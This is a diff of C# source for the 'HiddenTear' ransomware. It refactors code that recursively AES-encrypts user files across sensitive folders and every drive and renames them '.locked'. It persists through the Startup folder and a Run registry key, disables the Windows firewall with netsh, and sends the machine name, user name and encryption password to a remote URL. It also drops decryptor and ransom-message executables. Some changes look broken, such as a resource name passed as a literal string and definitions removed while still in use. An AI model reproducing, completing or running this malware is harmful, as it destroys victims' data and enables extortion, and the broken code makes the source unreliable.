@@ -13,42 +13,18 @@ namespace HiddenTear
 {
     public partial class Form1 : Form
     {
-        readonly string URL = "";                                          //https://www.example.com/hidden-tear/write.php?info=
-        readonly string LOGURL = "";                                       //https://www.example.com/hidden-tear/write.php?info=
-        readonly string CONTAINMENTPATH = "failsafe";                      //remove before using
-
-        readonly int PASSLENGTH = 32;
-        readonly byte[] SALT = new byte[] { 11, 46, 18, 4, 19, 0, 7, 62 };
-        readonly string[] EXTENTIONS = new[]
-        {
-                ".txt", ".doc", ".docx", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd", ".wps",//Text Files
-                ".csv", ".dat", ".ged", ".key", ".keychain", ".pps", ".ppt", ".pptx", ".sdf", ".tar", ".tax2014", ".tax2015", ".vcf", ".xml", //Data Files
-                ".aif", ".iff", ".m3u", ".m4a", ".mid", ".mp3", ".mpa", ".wav", ".wma", //Audio Files
-                ".3g2", ".3gp", ".asf", ".avi", ".flv", ".m4v", ".mov", ".mp4", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", //Video Files
-                ".3dm", ".3ds", ".max", ".obj", //3D Image Files
-                ".bmp", ".dds", ".gif", ".jpg", ".png", ".psd", ".tga", ".thm", ".tif", ".tiff", ".yuv", //Raster Image Files
-                ".ai", ".eps", ".ps", ".svg", //Vector Image Files
-                ".indd", ".pct", ".pdf", //Page Layout Files
-                ".xlr", ".xls", ".xlsx", //Spreadsheet Files
-                ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", //Database Files
-                ".dwg", ".dxf",//CAD Files
-                ".asp", ".aspx", ".cer", ".cfm", ".csr", ".css", ".htm", ".html", ".js", ".jsp", ".php", ".rss", ".xhtml", //Web Files
-                ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rar", ".rpm", ".sitx", ".tar.gz", ".zip", ".zipx", //Compressed Files
-                ".bin", ".cue", ".dmg", ".iso", ".mdf", ".toast", ".vcd", //Disk Image Files 
-                ".c", ".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".java", ".lua", ".m", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj", //Developer Files
-                ".bak", ".tmp", //Backup Files
-                ".crdownload", ".ics", ".msi", ".part", ".torrent", //Misc Files
-        };      //http://fileinfo.com/filetypes/common
-
-
-
-
         public Form1()
         {
             InitializeComponent();
         }
         private void Form1_Load(object sender, EventArgs e)
         {
+            string password = createPassword(PASSLENGTH);
+            string thisPath = Assembly.GetEntryAssembly().Location;
+            byte[] thisExe = File.ReadAllBytes(thisPath);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
+            addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");
+
             log("opened");
             Opacity = 0;
             this.ShowInTaskbar = false;
@@ -59,58 +35,21 @@ namespace HiddenTear
             Visible = false;
             Opacity = 100;
         }
-        void log(string message)
-        {
-            if (string.IsNullOrEmpty(LOGURL)) return; 
-            string info = Environment.MachineName + "-" + Environment.UserName + " : " + message;
-            var fullUrl = LOGURL + info;
 
-            using (System.Net.WebClient client = new System.Net.WebClient())
-            {
-                string testie = "";
-                try
-                {
-                    testie = client.DownloadString("google.com");
-                }
-                catch { }
-
-                if (!string.IsNullOrEmpty(testie))
-                {
-                    try
-                    {
-                        var content = client.DownloadString(fullUrl);
-                    }
-                    catch { }
-                }
-                else
-                {
-                    try
-                    {
-                        System.Diagnostics.Process process = new System.Diagnostics.Process();
-                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                        startInfo.FileName = "cmd.exe";
-                        startInfo.Arguments = "netsh firewall set opmode disable";
-                        process.StartInfo = startInfo;
-                        process.Start();
-
-                        process.WaitForExit();
-
-                        var content = client.DownloadString(fullUrl);
-                    }
-                    catch { }
-                }
-            }
-        }
-
+        static byte[] passwordBytes;
+        static List<string> crypted = new List<string>();
 
         void startAction()
         {
             string password = createPassword(PASSLENGTH);
+            string thisPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+            byte[] thisExe = File.ReadAllBytes(thisPath);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
+            addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");
 
             if (!string.IsNullOrEmpty(CONTAINMENTPATH))
             {
-                encryptDirectory(CONTAINMENTPATH, password);
+                encryptDirectory(CONTAINMENTPATH);
             }
             else
             {
@@ -130,22 +69,21 @@ namespace HiddenTear
                 };
                 foreach (string str in sensitiveDirs)
                 {
-                    encryptDirectory(str, password);
+                    encryptDirectory(str);
                 }
 
                 string[] drives = System.IO.Directory.GetLogicalDrives();
                 foreach (string str in drives)
                 {
-                    encryptDirectory(str, password);
+                    encryptDirectory(str);
                 }
             }
 
             dropFiles();
-            if (URL != "") sendPassword(password);        
+			if (URL != "") sendPassword(password);
             password = null;
             System.Windows.Forms.Application.Exit();
         }
-
         string createPassword(int length)
         {
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
@@ -155,13 +93,142 @@ namespace HiddenTear
             {
                 res.Append(valid[rnd.Next(valid.Length)]);
             }
+
+            passwordBytes = Encoding.UTF8.GetBytes(res.ToString());
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
             return res.ToString();
         }
+        void encryptDirectory(string location)
+        {
+            try
+            {
+                string[] files = Directory.GetFiles(location);
+                string[] childDirectories = Directory.GetDirectories(location);
+                for (int i = 0; i < files.Length; i++)
+                {
+                    string extension = Path.GetExtension(files[i]);
+                    if (EXTENTIONS.Contains(extension.ToLower()))
+                    {
+                        encryptFile(files[i]);
+                    }
+                }
+                for (int i = 0; i < childDirectories.Length; i++)
+                {
+                    encryptDirectory(childDirectories[i]);
+                }
+            }
+            catch { }
+        }
+        void encryptFile(string file)
+        {
+            try
+            {
+                try
+                {
+                    if (Mode == ExecutionMode.Full)
+                    {
+                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
+                        File.WriteAllBytes(file, bytesEncrypted);
+                        System.IO.File.Move(file, file + ".locked");
+                        crypted.Add(file);
+                    }
+                    else if (new FileInfo(file).Length <= 4096)
+                    {
+                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
+                        File.WriteAllBytes(file, bytesEncrypted);
+                        System.IO.File.Move(file, file + ".locked");
+                        crypted.Add(file);
+                    }
+                    else
+                    {
+                        byte[] buff = new byte[8192];
+                        using (BinaryReader reader = new BinaryReader(File.Open(file, FileMode.Open)))
+                        {
+                            byte[] bb = encryptAES(reader.ReadBytes(4096), passwordBytes);
+                            Array.Copy(bb, buff, bb.Length);
+                        }
+                        using (BinaryWriter writer = new BinaryWriter(File.Open(file, FileMode.Open)))
+                        {
+                            writer.Write(buff);
+                        }
+                        System.IO.File.Move(file, file + ".locked");
+                        crypted.Add(file);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    FileAttributes attributes = File.GetAttributes(file);
+                    if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
+                    {
+                        attributes = RemoveAttribute(attributes, FileAttributes.ReadOnly);
+                        File.SetAttributes(file, attributes);
+                    }
+
+                    if (Mode == ExecutionMode.Full)
+                    {
+                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
+                        File.WriteAllBytes(file, bytesEncrypted);
+                        System.IO.File.Move(file, file + ".locked");
+                        crypted.Add(file);
+                    }
+                    else if (new FileInfo(file).Length <= 4096)
+                    {
+                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
+                        File.WriteAllBytes(file, bytesEncrypted);
+                        System.IO.File.Move(file, file + ".locked");
+                        crypted.Add(file);
+                    }
+                    else
+                    {
+                        byte[] buff = new byte[8192];
+                        using (BinaryReader reader = new BinaryReader(File.Open(file, FileMode.Open)))
+                        {
+                            buff = encryptAES(reader.ReadBytes(4096), passwordBytes);
+                        }
+                        using (BinaryWriter writer = new BinaryWriter(File.Open(file, FileMode.Open)))
+                        {
+                            writer.Write(buff);
+                        }
+                        System.IO.File.Move(file, file + ".locked");
+                        crypted.Add(file);
+                    }
+                }
+            }
+            catch { }
+        }
+        byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+        {
+            byte[] encryptedBytes = null;
+            using (MemoryStream ms = new MemoryStream())
+            {
+                using (RijndaelManaged AES = new RijndaelManaged())
+                {
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(passwordBytes, SALT, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                        cs.Close();
+                    }
+                    encryptedBytes = ms.ToArray();
+                }
+            }
+
+            return encryptedBytes;
+        }
+
         void sendPassword(string password)
         {
             if (string.IsNullOrEmpty(URL)) return;
-            string info =   Environment.MachineName + "-" + 
-                            Environment.UserName + " " + 
+            string info = Environment.MachineName + "-" +
+                            Environment.UserName + " " +
                             password;
             var fullUrl = URL + info;
 
@@ -202,132 +269,119 @@ namespace HiddenTear
                 }
             }
         }
-        void encryptDirectory(string location, string password)
+        void log(string message)
         {
-            try
+            if (string.IsNullOrEmpty(LOGURL)) return;
+            string info = Environment.MachineName + "-" + Environment.UserName + " : " + message;
+            var fullUrl = LOGURL + info;
+
+            using (System.Net.WebClient client = new System.Net.WebClient())
             {
-                string[] files = Directory.GetFiles(location);
-                string[] childDirectories = Directory.GetDirectories(location);
-                for (int i = 0; i < files.Length; i++)
+                string testie = "";
+                try
                 {
-                    string extension = Path.GetExtension(files[i]);
-                    if (EXTENTIONS.Contains(extension.ToLower()))
+                    testie = client.DownloadString("google.com");
+                }
+                catch { }
+
+                if (!string.IsNullOrEmpty(testie))
+                {
+                    try
                     {
-                        encryptFile(files[i], password);
+                        var content = client.DownloadString(fullUrl);
                     }
+                    catch { }
                 }
-                for (int i = 0; i < childDirectories.Length; i++)
+                else
                 {
-                    encryptDirectory(childDirectories[i], password);
-                }
-            }
-            catch { }
-        }
-        void encryptFile(string file, string password)
-        {
-            try
-            {
-                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
-                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
-
-                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
-
-                byte[] bytesEncrypted = encryptAES(bytesToBeEncrypted, passwordBytes);
-
-                File.WriteAllBytes(file, bytesEncrypted);
-                System.IO.File.Move(file, file + ".locked");
-                crypted.Add(file);
-            }
-            catch { }
-        }
-        byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
-        {
-            byte[] encryptedBytes = null;
-            using (MemoryStream ms = new MemoryStream())
-            {
-                using (RijndaelManaged AES = new RijndaelManaged())
-                {
-                    AES.KeySize = 256;
-                    AES.BlockSize = 128;
-
-                    var key = new Rfc2898DeriveBytes(passwordBytes, SALT, 1000);
-                    AES.Key = key.GetBytes(AES.KeySize / 8);
-                    AES.IV = key.GetBytes(AES.BlockSize / 8);
-
-                    AES.Mode = CipherMode.CBC;
-
-                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    try
                     {
-                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
-                        cs.Close();
+                        System.Diagnostics.Process process = new System.Diagnostics.Process();
+                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                        startInfo.FileName = "cmd.exe";
+                        startInfo.Arguments = "netsh firewall set opmode disable";
+                        process.StartInfo = startInfo;
+                        process.Start();
+
+                        process.WaitForExit();
+
+                        var content = client.DownloadString(fullUrl);
                     }
-                    encryptedBytes = ms.ToArray();
+                    catch { }
                 }
             }
-
-            return encryptedBytes;
         }
-
-
-
-        List<string> crypted = new List<string>();
         void dropFiles()
         {
             if (crypted.Count < 1) return;
 
+            byte[] decryptorBuffer = getEmbeddedResource("HiddenTear.Embedded.HiddenTear-Decrypt.exe");
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\HTDecryptor.exe", decryptorBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\HTDecryptor.exe", decryptorBuffer);
+
+            byte[] messageBuffer = getEmbeddedResource("HiddenTear.Embedded.HiddenTear-Message.exe");
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\message.exe", messageBuffer);
+            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe", messageBuffer);
+
+            addToStartupRegistry("Message", Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");
+            startProcess(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");
+        }
+
+
+        static void dropFile(string path, byte[] buffer)
+        {
+            try 
+            {
+                if (!File.Exists(path))
+                {
+                    File.WriteAllBytes(path, buffer); 
+                }
+            }
+            catch { }
+        }
+        static byte[] getEmbeddedResource(string fullName)
+        {
             byte[] decryptorBuffer = default(byte[]);
-            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("HiddenTear.Embedded.HiddenTear-Decrypt.exe");
+            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("fullName");
             using (var memstream = new MemoryStream())
             {
                 stream.CopyTo(memstream);
                 decryptorBuffer = memstream.ToArray();
             }
-
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
-            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\HTDecryptor.exe", decryptorBuffer); }catch {}
-
-
-            byte[] messageBuffer = default(byte[]);
-            var stream1 = Assembly.GetExecutingAssembly().GetManifestResourceStream("HiddenTear.Embedded.HiddenTear-Message.exe");
-            using (var memstream = new MemoryStream())
-            {
-                stream1.CopyTo(memstream);
-                messageBuffer = memstream.ToArray();
-            }
-
-            try
-            {
-                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\message.exe", messageBuffer);
-            } catch { }
-            try
-            {            
-                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe", messageBuffer);
-            } catch { }
+            return decryptorBuffer;
+        }
+        static void addToStartupRegistry(string name, string path)
+        {
             try
             {
                 RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                add.SetValue("Message",
-                    "\"" + Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe" + "\"");
+                add.SetValue(name, "\"" + path + "\"");
             }
             catch { }
-
-
+        }
+        static void startProcess(string path)
+        {
             try
             {
-                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");
+                Process.Start(path);
             }
             catch { }
+        }
+        static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
+        {
+            return attributes & ~attributesToRemove;
         }
     }
 }
